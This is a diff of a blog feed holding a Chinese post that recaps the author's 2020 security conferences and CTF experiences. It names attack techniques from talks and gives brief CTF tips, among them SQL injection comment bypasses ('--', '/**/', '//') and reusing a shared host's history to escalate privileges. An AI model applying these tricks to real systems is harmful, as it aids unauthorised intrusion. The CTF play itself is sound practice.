-<p>噢對了，另外我還拿到了神奇序號，主要是右邊的<code>.tw</code>免費註冊域名，只是想Domain name是個令人頭疼的事QQ 另外左邊的<code>.GAY</code>工商真的頗炫wwww<br><img src="https://photos.smugmug.com/photos/i-Vtsg5ZK/0/76a2213d/X5/i-Vtsg5ZK-X5.jpg" alt=" "></p>
-<h3 id="SITCON-學生計算機年會-8-8-中研院人文社科館"><a href="#SITCON-學生計算機年會-8-8-中研院人文社科館" class="headerlink" title="SITCON 學生計算機年會 (8/8) @中研院人文社科館"></a>SITCON 學生計算機年會 (8/8) @中研院人文社科館</h3><p><strong>AIS3</strong> 結束隔天馬上就回高雄開會，隔了一週再度回到台北，有夠忙#<br><strong>SITCON</strong> 是我在大學期間蠻常聽到的Conf. ，無奈我大二轉學跑到NUK後比較沒有契機北上參加，今年由於疫情延到暑假（歷年都辦在三月），配合下一個<strong>CYBERSEC</strong>活動，當然是參加啦！ 也感謝社群朋友的讓票，原本沒搶到票想說到時候再用小額贊助$1000的方式拿票，還順便幫<strong>翔君</strong>撿了一張（笑）</p>
-<p><a href="https://www.flickr.com/photos/sitcon/50258126176/in/album-72157715603590802/?fbclid=IwAR05p6AZvcP_lJV2bbibBLXEqtbycMxuH4p5cOg6wJ3qTCMQz9nWEKsdqe4"><img src="https://photos.smugmug.com/photos/i-D97rvd8/0/336c7704/X4/i-D97rvd8-X4.jpg"></a></p>
-<p>然後，8/8 當天我睡過頭了XDDDD<br>因為前一天深夜才到台北，家人早上又是6點出門，所以我5:30起床和他們討論晚上的父親節行程，然後睡回籠覺Zzzz 後來發現遲到直接搭小黃花了$350有夠散財，還錯過開幕式 可惡qq 不過事後補看開場動畫真的用心，感覺很適合拿來搭音Game的PV XD<br>不得不說很佩服這種全部由學生自發起扛起的Conf. ，場面上也看到很多在資訊圈的熟面孔。</p>
-<p>活動主要分兩個部分，分別是大地遊戲 &amp; 議程。<br>先說說大地遊戲好了，簡單講就是透過他們的app和攤位互動，達成賓果連線可以換指定小物。但是由於議程之間的休息時間很短，所以我有放掉幾場花時間和攤位交流，像是<strong>AMD</strong>飲料店 (??) 還有<strong>奧義</strong>冰淇淋公司 (???) XDDDDD  </p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-TJm3kHQ/0/41f652ad/X5/i-TJm3kHQ-X5.jpg" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-THSfZ5T/0/75256824/X3/i-THSfZ5T-X3.jpg" alt=" "></div></div></div></div>
-
-<p>題外話 <a href="https://www.flickr.com/photos/sitcon/50258130671/in/album-72157715603590802/?fbclid=IwAR2JXBNnVeNYmWfefPT5jJJZcBnw_jA8byXbESAwLPStVCKRDklF5sxTbUw">奧義冰淇淋</a> 這張構圖我很喜歡，官方攝影組好強w</p>
-<p>不過下午全部連線才發現獎品都發完了，嗚嗚花太多時間聽議程了(雖然也不是壞事)，所以只有拿<strong>愛情彩</strong>的彩券(但最後也沒中獎)，另外由於大家都連會場的Wi-Fi，結果有些攤位需要Facebook按讚分享的活動很容易被ban掉，我猜是Session不夠用爆掉了嘖嘖。</p>
-<p>再來說說議程，既然是以學生為本的，原本以為應該不會太難懂… 不 我錯了，雖然沒有到完全聽不懂的慘，但也足夠讓我感受到同樣身為學生但技術上的距離感。 簡單介紹幾個有趣的議題：</p>
-<ul>
-<li>「<a href="https://www.youtu.be/1gFBx16AlMc">第一次做密室逃脫就上手</a>」結合IoT、AI、AR架起來的密室逃脫，整場描述如何用從0開始把每個機關慢慢做起來，其中有一項是很有科技感的儀式台然後用雷射造型掃描進行比對，背後原理是RFID辨識，然後講師說對外行人可以騙說是AI辨識真的快笑死。</li>
-<li>「<a href="https://youtu.be/TkC19ukBBxk">Playing Win32 Like a K!NG ;)</a>」小馬adr1講的是<code>UAC Bypass</code>，讓駭客能夠騙過系統拿到高權限，還有系統程式的<code>DLL Hijacking</code>、<code>Path Normalization</code>，附帶幾個小Demo… 說真的能這麼容易被繞過聽起來也蠻可怕的= w =</li>
-<li>「<a href="https://youtu.be/C94DAdAlUZ8">自己的機房自己蓋！</a>」整理機房的心得，看得出不只是硬體上的採購，系統方面的佈局也需要時間下功夫，另外就是人脈很重要XDDD 有免費的資源可以拿最棒惹嘻嘻。</li>
-<li>「<a href="https://youtu.be/NGqXSCFvZ3M">我只是個學生，架個網站不想花錢</a>」原本是衝著Github Page的其他玩法，不過這場講的是架個縮網址網站並透過各種免費資源搭建，像是拿Google App Script作為資料庫進行轉址，一路聽下來感覺我好像不太會用到XD</li>
-<li>「<a href="https://youtu.be/49N0uO86oX0">就算是新手，有愛就沒把專案做出來，對吧</a>」記得是談學生用業界的分工方式實作專案，包含工程師、設計師、產品經理等等的經驗，不過老實說這場只是被我在R0休息順便聽的（抹臉）</li>
-<li>「<a href="https://youtu.be/aomXTCTlIW4">CDN 網站攻擊 - 這次換駭客當鬼來抓你了</a>」<br>由Mico介紹，備受好評的一場，也是因為這場讓我對<code>CDN</code>有新的認識，原來駭客還能利用CDN繞過WAF，或是間接撈到一些本來應該藏起來的資訊，如果有時間的朋友蠻推薦去看ㄉ，整場聽完發現一堆domain knowledge要補QQ</li>
-</ul>
-<p>噢對了，還有Lighting Talk，老實說聽了三年MOPCON的經驗，五分鐘好像不太容易被拔線XD 大家都很會抓時間，這次有場真的吸引到我… 嗯更正，是吸引到全場目光，在R0廳的大銀幕玩雲端遊戲真的有夠狂XDDDD</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-2rbdNCH/0/94153796/X3/i-2rbdNCH-X3.jpg" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-r3MnRLN/0/3dec5879/X5/i-r3MnRLN-X5.jpg" alt=" "></div></div></div></div>
-
-<p>最後還偷偷在塗鴉牆上幫MacacaHub留名ww<br>總之，整體下來玩得很開心，第一次參加也趁機認識些大神，希望有機會自己能練到和他們差不多的水平&gt;&lt;</p>
-<h3 id="CYBERSEC-臺灣資安大會-8-11-8-12-南港展覽館二館"><a href="#CYBERSEC-臺灣資安大會-8-11-8-12-南港展覽館二館" class="headerlink" title="CYBERSEC 臺灣資安大會 (8/11 - 8/12) @南港展覽館二館"></a>CYBERSEC 臺灣資安大會 (8/11 - 8/12) @南港展覽館二館</h3><p>同樣因疫情影響延到暑假為期兩天的 <strong>CYBERSEC</strong>，由於和 <strong>SITCON</strong> 事隔兩天。加上 Lab 有派人出差，所以我就把行程排在一起了~<br>這場相對前面幾次 Conference，定位上比較面<strong>企業向</strong>，因此從報名到問卷調查常常會問到公司營運相關事項，當然這方面我都拿 Lab 或是 MacacaHub 來填（笑）</p>
-<p>整體活動分成 展覽 &amp; 議程 &amp; CyberLAB。</p>
-<p>先來談談 CyberLAB實戰攻防演練，不同於議程的人數，這個比較偏向單場 20 人的小班制教學（一天四場），Day 1 我經過看到那個報名排隊人潮直接打消念頭XDDD </p>
-<p>展覽方面和資訊博覽會很像，簡單講就是企業擺攤宣傳各種研發成果，其中不乏看得到一些眼熟的企業，像是趨勢科技、Microsoft、奧義智慧、Devcore、中華資安國際 之類ㄉ，而主辦官方加入了大地遊戲的要素，透過和攤位的互動完成對應的條件拿到不同的贈品，先不提光方的贈品很快就被搶完，反倒是每個攤位送的贈品也毫不手軟，看到不少人提的大包小包 …看來大家都是窮到來這裡搶資源 <del>絕對不是什麼議程蟑螂</del> 。</p>
-<p><img src="https://photos.smugmug.com/photos/i-q5N8WCc/0/52d606d9/X5/i-q5N8WCc-X5.jpg" alt=" "></p>
-<p>透過這場活動我也才意識到其實作純資安的公司還不少，雖然探聽了幾間好像大多都是以接case的形式居多，說真的資安這行真的出事才會重視蠻尷尬的QQ 不過從一些議程已經有些單位在推資安框架，整合一些SOP做事前防禦，看起來應該還是有蠻大的發展空間。</p>
-<p>攤位中印象最深的果然還是<strong>奧義智慧</strong>吧，不愧是新創的科技公司，攤位活動展示VR模擬滲透內網、「Cyber IQ數位帝國保衛戰」答題遊戲、資安小學堂問答遊戲、結合MITRE ATT&amp;CK知識的Cyber War卡牌類桌遊，何況他們還吸收了許多CTF圈的人才，能深得我們年輕資訊人的歡迎也是預期之中… 更不用說連衣服的設計上各種致敬新世紀福音戰士 太酷了啦XD</p>
-<p><img src="https://photos.smugmug.com/photos/i-Bw88z77/0/68ca64b9/X5/i-Bw88z77-X5.jpg" alt=" "></p>
-<p>議程方面，原本想為碩論找些「雲端」議題的議程，可惜都沒聽到什麼有趣的技術分享，反而是圍繞在「人為疏失」如何管理權限這一類偏企業向基本觀念的話題，或是各種工商，有點可惜Orz。另外也照慣例跑去聽了小馬的場，只能說那個場地配置…有點酷？聽說是上一場議程時主投影機出問題，所以直接整個會場座位轉90度用副投影幕，導致講者台在觀眾後面，然後小馬跟觀眾同台XDDDDD</p>
-<p><img src="https://photos.smugmug.com/photos/i-tBTNdhv/0/6ec83faa/X4/i-tBTNdhv-X4.jpg" alt=" "></p>
-<p>在 Day 1 結束我還帶著 Lab 同學跑去<strong>天瓏書店</strong>朝聖，資訊方面藏書多到很好混時間的好地方：）<br>整體下來CYBERSEC算是個內容蠻豐富的場次，主要是投入的廠商夠多所呈現的場面夠大，而且也是這個暑假拿最多免費周邊的一次（笑）</p>
-<hr>
-<h2 id="剩下的放結尾"><a href="#剩下的放結尾" class="headerlink" title="剩下的放結尾"></a>剩下的放結尾</h2><blockquote>
-<p>9/27 UPDATE</p>
-</blockquote>
-<p>事隔一個月後還有另外兩場資安相關的Conference，雖然時間上不算是<strong>Summer Conf</strong>.，但我也沒打算再開新一篇介紹，所以就繼續在這篇往下更新了 XD</p>
-<h3 id="CISC-全國資訊安全會議-9-1-9-4-NSYSU"><a href="#CISC-全國資訊安全會議-9-1-9-4-NSYSU" class="headerlink" title="CISC 全國資訊安全會議 (9/1 - 9/4) @NSYSU"></a>CISC 全國資訊安全會議 (9/1 - 9/4) @NSYSU</h3><p>原本也是預計辦在五月的會議，偉哉武漢肺炎各種大延期，這場的定位對我來說比較特別，身在主辦方校又是以工人的身份下場幫忙。<br>和規模上和前幾場相比贊助商少了許多，整體會議稍稍陽春一些，今年是第卅屆雖然我不確定之前是否都差不多，但各位工人們都很認真幫忙這倒是真的 :3</p>
-<p>會議時間上長達四天，但實際上議程只有中間 Day 2, Day 3 兩天。<br>Day 1 上午場佈、下午由我們<strong>MacacaHub</strong>以「基礎網頁安全演練」作為CISC開場打頭陣（現在想想我還是不解為何要開 Day 1 的行程 …）<br>Day 4 是活動參訪，分別為爬柴山<del>給猴子看</del>，還有海域純玩水，但由於當時已經有下雨預告的消息，所以取消了0人報名的爬山活動（!）。</p>
-<p>由於 Day 1 的資安演練是額外活動讓會眾自由報名參加，因此原本展哥設定的目標學生是以大學生/碩士生為主，強調<font color=red>基礎</font>網頁安全演練，結果從後台的表單上看到報名會眾都至少都是碩士生，甚至還有幾位是主管等級讓我們大感意外XD 不過最後證實參與的會眾確實都不是這方面專業的，讓我們連原本預期的進度(<code>XSS</code>)都沒時間細講只能匆匆帶過，就這樣<del>抱著展哥的腿</del>平安度過 Day 1。</p>
-<p><img src="https://photos.smugmug.com/photos/i-VPHCwXR/0/1ba7d805/X5/i-VPHCwXR-X5.jpg" alt=" "></p>
-<blockquote>
-<p>發現野生的奧義間諜www</p>
-</blockquote>
-<p>Day 2 / Day 3 我的主要工作是和Lab學弟搭擋負責 Session A 論文發表的場控/計時/拍照 以及協助主持人和A1場評審，所以很難花心思認真聽報告QQ 何況我被分配到的 Session 比其他場次的組別硬是多了一組，加上台下Q&amp;A實在不受控，想當然爾時間上爆炸不可避ㄏㄏ，工人群組內幾乎只有我回報會晚結束，只能說當個時間管理大師真不容易(X) 老實說要用10分鐘講完一篇研究真的很不夠用，何況包含QA又要把時間壓得更緊，辛苦各位講者了。</p>
-<p>值得一提的還有 Day 2 晚宴在西子灣沙灘會館，雖然從學長的反應看得出應該是已經吃到習以為常了，不過我們倒是喝了不少酒（笑）</p>
-<p>另外，Day 3 上午有資管系主辦的 CISC CTF，所以我們<strong>MacacaHub</strong>就挽起袖子下場一起玩XDDD 整體難度中間偏易，主要有幾題Pwn直接被我忽略XD 其中一題原本要考 <a href="https://www.ithome.com.tw/news/135665">CVE-2019-18634</a>，結果因為所有參賽者共用主機，所以當我Google完CVE後就直接在主機內下<code>history</code>指令看到前一位參賽者 git pull 下來的 PoC，直接被我拿來提權拿Flag XDDDDD<br>還有連續兩題的SQLi，結果同樣<code>--</code>的註解在 SQLi-1 可繞過，但在 SQLi-2 居然沒辦法 = =<br>原本以為是 SQLi-2 的空白繞過沒成功（用<code>/**/</code>），結果賽後討論才發現把註解改成<code>//</code>就拿到flag了…</p>
-<p>原本我一直都穩定位居第四名，最後40多分鐘我集中在分析 Windows 的 event log，雖然用事件分析工具花了不少時間把 Powershell 的 command 還原出來但沒有成功執行QQ 賽後聽到展哥用 strings 就把 command dump 出來也沒成功（但至少不用像我還要慢慢還原XD），等回過神結束時才發現掉到第五名，和前一名差不到 50 分… <strong>唔嗯，我沒有寫Welcome(50)</strong> 笑死XD 反正最後 4,5,6 名都並列<strong>展露頭角獎</strong>也還好就是~</p>
-<blockquote>
-<p>順帶一提前三名: CSY、展哥、Mumu，全部都是南部資安圈熟面孔自己人 ㄏㄏ</p>
-</blockquote>
-<p>Day 4 本來應該是安排爬山和海域玩水，由於 Day 2 取消了爬山的部分，海域的部分礙於不能取消(?)，所以我們很多工人都被抓下海(??)強制玩水，甚至我明明沒填表單卻還是被秘書姊姊從後台報名XDDD 剛好拿CTF撿到的500摳家樂福禮券去買了件泳褲:/</p>
-<p>當天集合時有幾位會眾出現，可能是誤會有爬山活動、又或是以為只有踩踩海灘，總之最後都回家了:))))<br>剩下我們10來位被迫參加的工人各種玩風帆、獨木舟、趴板其實也蠻愉快的，只是菜逼八沒做好防曬整個曬到爆XD</p>
-<h3 id="HITCON-臺灣駭客協會-9-11-9-12-中研院人文社科館"><a href="#HITCON-臺灣駭客協會-9-11-9-12-中研院人文社科館" class="headerlink" title="HITCON 臺灣駭客協會 (9/11 - 9/12) @中研院人文社科館"></a>HITCON 臺灣駭客協會 (9/11 - 9/12) @中研院人文社科館</h3><p>終於輪到最後一場 <strong>Summer Conf</strong>.，同時是首次和 Lab 各位一起北上參加活動，某方面來說有點像畢業旅行(?)</p>
-<p>這次同樣因為疫情影響，在票種上分成線上 &amp; 實體。<br>線上的部分是用開源遊戲引擎 minetest 架設的虛擬會場，一整個 minecraft 風格，可惜我這方面並沒有涉獵太深。實體方面就和之前的 Conf. 形式上同樣是以議程為主，只是這場雖然有廠商但沒有大地遊戲，算是省了到處跑的力氣w</p>
-<p><img src="https://photos.smugmug.com/photos/i-sbWxkQL/0/361efccb/X2/i-sbWxkQL-X2.jpg" alt=" 南港高鐵票 "></p>
-<p>第一次做高鐵到南港終點站還蠻新鮮的… 雖然這裡看起來有點荒涼ㄏ<br>飯店的部分我們統一住洛基大飯店<a href="https://goo.gl/maps/xK7EwTqwyWZ6LsAt9">(Google map)</a>個人覺得蠻舒適的，說實在身為台北人實在很難得住台北飯店 XDDD<br><br>Day 0 我們在 check in 後晚餐吃<strong>YAYOI．やよい軒</strong>，雖然價格上有點小貴但我吃得很開心www 尤其我點的餐點還有附說明書(??)<br>交通方面我傻傻地帶著幾位同學坐捷運一站到南港展覽館等免費接駁車，然後比我們晚出發的同學比我們早到才知道原來飯店前就有公車可以直接到工研院，算是我沒算到的失誤 wwww 可惡</p>
-<p><img src="https://photos.smugmug.com/photos/i-XTxk9QF/0/ea852bea/X2/i-XTxk9QF-X2.jpg" alt=" YAYOI "></p>
-<p>議程部分的講師已經可以認出很多熟面孔了www<br>寬寬、birdman、小馬、Alan Lee、Orange Tsai、木棍Inndy、Allen Own、ddaa、yuawn、Angelboy、Lays、Jeffxx，幾乎都是駭客圈的紅人XD<br>這些大神們場子人都不會太少，尤其 Orange 再次打穿 Facebook 的主題在 R0 快被塞爆==</p>
-<p>在廠商攤位方面，照往例就是到處認親、認識朋友，只是同學把我當許願機拿贈品還稱讚我議程蟑螂… 嗚嗚幹，另外咱們 stavhaygn 在 UCCU 的主題是數位安全＆實體安全，蠻有趣的挑戰，讓我想起自己小時候筆電袋被父母上鎖時也是用迴紋針之類的工具慢慢解鎖ㄏ</p>
-<p><img src="https://photos.smugmug.com/photos/i-bBr6pfd/0/681396b8/X2/i-bBr6pfd-X2.jpg" alt=" UCCU 實體解鎖挑戰"></p>
-<p>其他像是 DEVCORE、BambooFox、TeamT5、中華資安 都有各自的 CTF challenge，所以少了大地遊戲也不怕沒事做。另外 HITCON GIRLS 辦的 “Who is Lily?” OSINT 挑戰也很酷，還需要在 HITCON 現場找人、寄釣魚信件才算完成任務！</p>
-<p>在官方的活動中還有線上密室逃脫，很感謝 AIS3 室友的邀請，找齊四人就在會場的角落玩，甚至還被 iThome 記者拍到寫進<a href="https://www.ithome.com.tw/news/139967">新聞</a>裡wwwwww 至於玩法大致上都寫在文章內，比較障礙是我和揪來的學妹都沒有接觸過 minecraft，所以在操作上備受關愛ww</p>
-<p>至於有沒有拿到 Flag 呢… 我忘記了w 不過有挖到一題 pwn 但不確定隊友有沒有解出來，我自己是在不同房間到處亂晃找線索，還有玩 minetest 裡的電腦的踩地雷XD 活動結束後還有無差別槍戰不知道在幹嘛，我只記得我一直掉出場外領便當 : (</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-ZfTKqxF/0/9ec7ba80/X2/i-ZfTKqxF-X2.png" alt=" minetest 踩地雷"></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-MZGT42R/0/782bcd26/X2/i-MZGT42R-X2.png" alt=" minetest 風景?"></div></div></div></div>
-
-<p><img src="https://photos.smugmug.com/photos/i-4r8s4Kh/0/4cc33354/X2/i-4r8s4Kh-X2.png" alt=" 槍戰 "></p>
-<p>印象中往年都有 HITCON token，今年也不例外。不過由於是用虛擬貨幣，所以對沒有再接觸的朋友很多都懶得操作，所以我<del>社工</del>借用身邊同學把官方送的錢包(300 HITCON token)轉到我手上，然後拿去HITCON線上商城買了幾塊電路板，到 Day2 甚至還開放可以購買現場的特色貼紙<br>… 當然是給他買爆 嘻嘻!!</p>
-<p><img src="https://photos.smugmug.com/photos/i-675NRWx/0/62e78e20/X2/i-675NRWx-X2.jpg" alt=" hitcon 貼紙 "></p>
-<p>沒有比較沒有傷害，雖然我是第一次參加 HITCON，但和其他場次相比感覺就是有點…掉漆，先不論少了往年慣例的電路板challenge、煉蠱大會開天窗。 Day1 報到的時候發了一個黑盒子沒有給提袋，看到大家都當寶貝到處抱著，結果那個黑盒子不僅是一次性的拆了就壞，而且裡頭都是廠商的DM … 怪不得 Day2 還能疊成塔拜託大家領走 = w =</p>
-<p><img src="https://photos.smugmug.com/photos/i-8PgpLrK/0/61b84068/X2/i-8PgpLrK-X2.jpg" alt=" 黑盒子 "></p>
-<p>總之，還是多少在 HITCON 聽到一些有趣的議題/關鍵字，只差在有沒有時間回去翻QwQ<br>接下來應該就是 10月的 MOPCON，已經要參加第四年應該寫不出心得了吧XDDDDDD</p>
-<p>就醬。</p>
-]]></content>
-      <categories>
-        <category>實驗室日誌</category>
-      </categories>
-      <tags>
-        <tag>AIS3</tag>
-        <tag>COSCUP</tag>
-        <tag>SITCON</tag>
-        <tag>CYBERSEC</tag>
-        <tag>CISC</tag>
-        <tag>HITCON</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ASIS CTF Quals 2020 Experience</title>
     <url>/2020/2fd4e7c6cebb/</url>
-    <content><![CDATA[<p>暑假第一場CTF online!!! 同時也是我們<strong>MacacaHub</strong>的今年第三戰~<br>不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ<br>題組全部共31題，雖然只解 4 題還有 Rank 151 / 815 … 太可怕了==</p>
-<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp" alt=" "></p>
+    <content><![CDATA[<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp" alt=" "></p>
+<p>暑假第一場CTF online!!! 同時也是我們<strong>MacacaHub</strong>的今年第三戰~<br>不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ<br>題組全部共31題，雖然只解 4 題還有 Rank 151 / 815 … 太可怕了==</p>
 <a id="more"></a>
 
 <p><a href="https://ctftime.org/event/964">CTFtime link</a></p>
